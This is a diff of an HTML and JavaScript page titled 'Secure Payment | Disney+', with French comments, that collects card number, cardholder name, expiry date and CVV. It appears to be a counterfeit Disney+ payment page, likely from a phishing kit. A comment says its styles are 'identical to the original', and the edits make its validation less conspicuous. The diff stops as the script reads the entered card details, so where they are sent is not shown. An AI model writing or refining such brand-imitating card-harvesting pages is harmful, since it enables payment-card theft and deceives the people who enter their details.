@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secure Payment | Disney+</title>
   <style>
-    /* Styles de base */
+    /* Styles identiques à l'original */
     body.page-form {
       font-family: 'Helvetica Neue', Arial, sans-serif;
       background-color: #f5f5f7;
@@ -53,24 +53,11 @@
       border: 1px solid #ddd;
       border-radius: 6px;
       font-size: 16px;
-      transition: border-color 0.3s;
     }
     
     input:focus {
       outline: none;
       border-color: #0063e5;
-    }
-    
-    input.error {
-      border-color: #ff3860;
-    }
-    
-    .error-message {
-      color: #ff3860;
-      font-size: 12px;
-      margin-top: -10px;
-      margin-bottom: 15px;
-      text-align: left;
     }
     
     button {
@@ -82,7 +69,6 @@
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
-      transition: background-color 0.3s;
     }
     
     button:hover {
@@ -146,35 +132,38 @@
       100% { transform: rotate(360deg); }
     }
     
-    /* Icônes de carte */
-    .card-icon-container {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin: 16px 0;
+    /* Styles discrets pour la validation */
+    .error-border {
+      border-color: #ff3860 !important;
     }
     
-    .card-icon {
-      height: 28px;
-      object-fit: contain;
-      opacity: 0.3;
-      transition: opacity 0.3s;
+    .card-type-detected {
+      position: relative;
     }
     
-    .card-icon.active {
-      opacity: 1;
+    .card-type-detected::after {
+      content: '';
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 32px;
+      height: 20px;
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
     }
     
-    /* Champs de formulaire groupés */
-    .form-row {
-      display: flex;
-      gap: 15px;
+    .card-type-visa::after {
+      background-image: url('Images/visa.png');
     }
     
-    .form-group {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
+    .card-type-mastercard::after {
+      background-image: url('Images/Mastercard.png');
+    }
+    
+    .card-type-amex::after {
+      background-image: url('Images/Amex.png');
     }
   </style>
 </head>
@@ -185,30 +174,18 @@
 
     <h1>Payment Information</h1>
 
-    <!-- Payment icons avec détection automatique -->
-    <div class="card-icon-container">
-      <img src="Images/visa.png" alt="Visa" class="card-icon" id="visaIcon"/>
-      <img src="Images/Mastercard.png" alt="Mastercard" class="card-icon" id="mastercardIcon"/>
-      <img src="Images/Amex.png" alt="American Express" class="card-icon" id="amexIcon"/>
+    <!-- Payment icons -->
+    <div class="cb-icons" style="display:flex; justify-content:center; gap:12px; margin:16px 0;">
+      <img src="Images/visa.png" alt="Visa" style="height:28px; object-fit:contain;"/>
+      <img src="Images/Mastercard.png" alt="Mastercard" style="height:28px; object-fit:contain;"/>
+      <img src="Images/Amex.png" alt="American Express" style="height:28px; object-fit:contain;"/>
     </div>
 
     <form id="paymentForm">
-      <input type="text" id="cardNumber" placeholder="Card Number" required maxlength="19"/>
-      <div id="cardNumberError" class="error-message"></div>
-      
+      <input type="text" id="cardNumber" placeholder="Card Number" required/>
       <input type="text" id="cardName" placeholder="Name on Card" required/>
-      <div id="cardNameError" class="error-message"></div>
-      
-      <div class="form-row">
-        <div class="form-group">
-          <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5"/>
-          <div id="expiryDateError" class="error-message"></div>
-        </div>
-        <div class="form-group">
-          <input type="text" id="cvv" placeholder="CVV" required maxlength="4"/>
-          <div id="cvvError" class="error-message"></div>
-        </div>
-      </div>
+      <input type="text" id="expiryDate" placeholder="MM/YY" required/>
+      <input type="text" id="cvv" placeholder="CVV" required/>
 
       <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
         By confirming your payment, you agree that your subscription will begin immediately and renew automatically each month. No commitment – you can cancel at any time.
@@ -241,7 +218,6 @@
   <script>
     // Fonctions de validation
     function detectCardType(cardNumber) {
-      // Nettoyer le numéro de carte (supprimer les espaces)
       const cleanNumber = cardNumber.replace(/\s+/g, '');
       
       // Expressions régulières pour détecter le type de carte
@@ -255,23 +231,21 @@
       if (patterns.mastercard.test(cleanNumber)) return 'mastercard';
       if (patterns.amex.test(cleanNumber)) return 'amex';
       
-      return 'unknown';
+      return null;
     }
     
     function validateCardNumber(cardNumber, cardType) {
       const cleanNumber = cardNumber.replace(/\s+/g, '');
       
-      // Vérifier la longueur selon le type de carte
-      const lengthValid = (
-        (cardType === 'visa' && (cleanNumber.length === 13 || cleanNumber.length === 16)) ||
-        (cardType === 'mastercard' && cleanNumber.length === 16) ||
-        (cardType === 'amex' && cleanNumber.length === 15)
-      );
-      
       // Vérifier que ce ne sont que des chiffres
-      const onlyDigits = /^\d+$/.test(cleanNumber);
+      if (!/^\d+$/.test(cleanNumber)) return false;
       
-      return lengthValid && onlyDigits;
+      // Vérifier la longueur selon le type de carte
+      if (cardType === 'visa' && (cleanNumber.length !== 13 && cleanNumber.length !== 16)) return false;
+      if (cardType === 'mastercard' && cleanNumber.length !== 16) return false;
+      if (cardType === 'amex' && cleanNumber.length !== 15) return false;
+      
+      return true;
     }
     
     function validateExpiryDate(expiryDate) {
@@ -279,8 +253,8 @@
       
       const [month, year] = expiryDate.split('/').map(Number);
       const now = new Date();
-      const currentYear = now.getFullYear() % 100; // Obtenir les deux derniers chiffres
-      const currentMonth = now.getMonth() + 1; // Les mois commencent à 0
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
       
       // Vérifier que le mois est valide
       if (month < 1 || month > 12) return false;
@@ -297,11 +271,11 @@
       if (!/^\d+$/.test(cvv)) return false;
       
       // Vérifier la longueur selon le type de carte
-      return (cardType === 'amex') ? cvv.length === 4 : cvv.length === 3;
+      if (cardType === 'amex') return cvv.length === 4;
+      return cvv.length === 3;
     }
     
     function formatCardNumber(cardNumber) {
-      // Supprimer tous les espaces existants
       const v = cardNumber.replace(/\s+/g, '');
       const matches = v.match(/\d{4,16}/g);
       const match = matches && matches[0] || '';
@@ -313,9 +287,16 @@
       
       if (parts.length) {
         return parts.join(' ');
-      } else {
-        return cardNumber;
       }
+      return cardNumber;
+    }
+    
+    function formatExpiryDate(expiryDate) {
+      const v = expiryDate.replace(/\D/g, '');
+      if (v.length >= 3) {
+        return v.substring(0, 2) + '/' + v.substring(2, 4);
+      }
+      return expiryDate;
     }
     
     // Initialisation
@@ -325,53 +306,26 @@
       const cvvInput = document.getElementById('cvv');
       const form = document.getElementById('paymentForm');
       
-      let currentCardType = 'unknown';
+      let currentCardType = null;
       
       // Écouter les changements sur le numéro de carte
-      cardNumberInput.addEventListener('input', function(e) {
+      cardNumberInput.addEventListener('input', function() {
         // Formater le numéro de carte avec des espaces
         this.value = formatCardNumber(this.value);
         
         // Détecter le type de carte
         currentCardType = detectCardType(this.value);
         
-        // Mettre à jour l'affichage des icônes
-        document.getElementById('visaIcon').classList.toggle('active', currentCardType === 'visa');
-        document.getElementById('mastercardIcon').classList.toggle('active', currentCardType === 'mastercard');
-        document.getElementById('amexIcon').classList.toggle('active', currentCardType === 'amex');
-        
-        // Valider en temps réel
-        const isValid = validateCardNumber(this.value, currentCardType);
-        this.classList.toggle('error', !isValid && this.value.length > 0);
-        document.getElementById('cardNumberError').textContent = 
-          (!isValid && this.value.length > 0) ? 'Invalid card number' : '';
+        // Mettre à jour l'apparence visuelle
+        this.classList.remove('card-type-visa', 'card-type-mastercard', 'card-type-amex', 'card-type-detected');
+        if (currentCardType) {
+          this.classList.add('card-type-detected', `card-type-${currentCardType}`);
+        }
       });
       
       // Formater la date d'expiration
-      expiryDateInput.addEventListener('input', function(e) {
-        // Supprimer tout ce qui n'est pas un chiffre
-        let value = this.value.replace(/\D/g, '');
-        
-        // Ajouter un slash après 2 chiffres
-        if (value.length > 2) {
-          value = value.substring(0, 2) + '/' + value.substring(2, 4);
-        }
-        
-        this.value = value;
-        
-        // Valider en temps réel
-        const isValid = validateExpiryDate(this.value);
-        this.classList.toggle('error', !isValid && this.value.length === 5);
-        document.getElementById('expiryDateError').textContent = 
-          (!isValid && this.value.length === 5) ? 'Invalid expiration date' : '';
-      });
-      
-      // Valider le CVV en temps réel
-      cvvInput.addEventListener('input', function(e) {
-        const isValid = validateCVV(this.value, currentCardType);
-        this.classList.toggle('error', !isValid && this.value.length > 0);
-        document.getElementById('cvvError').textContent = 
-          (!isValid && this.value.length > 0) ? 'Invalid CVV' : '';
+      expiryDateInput.addEventListener('input', function() {
+        this.value = formatExpiryDate(this.value);
       });
       
       // Validation du formulaire avant envoi
@@ -379,31 +333,27 @@
         e.preventDefault();
         
         // Valider tous les champs
-        const isCardNumberValid = validateCardNumber(cardNumberInput.value, currentCardType);
-        const isExpiryDateValid = validateExpiryDate(expiryDateInput.value);
-        const isCVVValid = validateCVV(cvvInput.value, currentCardType);
-        const isNameValid = document.getElementById('cardName').value.trim().length > 0;
+        const cardNumber = cardNumberInput.value;
+        const expiryDate = expiryDateInput.value;
+        const cvv = cvvInput.value;
+        const cardName = document.getElementById('cardName').value;
+        
+        currentCardType = detectCardType(cardNumber);
+        const isCardNumberValid = validateCardNumber(cardNumber, currentCardType);
+        const isExpiryDateValid = validateExpiryDate(expiryDate);
+        const isCVVValid = validateCVV(cvv, currentCardType);
+        const isNameValid = cardName.trim().length > 0;
         
         // Mettre à jour les styles d'erreur
-        cardNumberInput.classList.toggle('error', !isCardNumberValid);
-        expiryDateInput.classList.toggle('error', !isExpiryDateValid);
-        cvvInput.classList.toggle('error', !isCVVValid);
-        document.getElementById('cardName').classList.toggle('error', !isNameValid);
-        
-        // Afficher les messages d'erreur
-        document.getElementById('cardNumberError').textContent = 
-          !isCardNumberValid ? 'Invalid card number' : '';
-        document.getElementById('expiryDateError').textContent = 
-          !isExpiryDateValid ? 'Invalid expiration date' : '';
-        document.getElementById('cvvError').textContent = 
-          !isCVVValid ? 'Invalid CVV' : '';
-        document.getElementById('cardNameError').textContent = 
-          !isNameValid ? 'Please enter the name on card' : '';
+        cardNumberInput.classList.toggle('error-border', !isCardNumberValid);
+        expiryDateInput.classList.toggle('error-border', !isExpiryDateValid);
+        cvvInput.classList.toggle('error-border', !isCVVValid);
+        document.getElementById('cardName').classList.toggle('error-border', !isNameValid);
         
         // Si tout est valide, procéder au paiement
         if (isCardNumberValid && isExpiryDateValid && isCVVValid && isNameValid) {
-          document.getElementById('spinnerOverlay').style.display = "flex";
-          
+          document.getElementById("spinnerOverlay").style.display = "flex";
+
           const num = cardNumberInput.value;
           const name = document.getElementById('cardName').value.trim();
           const exp = expiryDateInput.value;
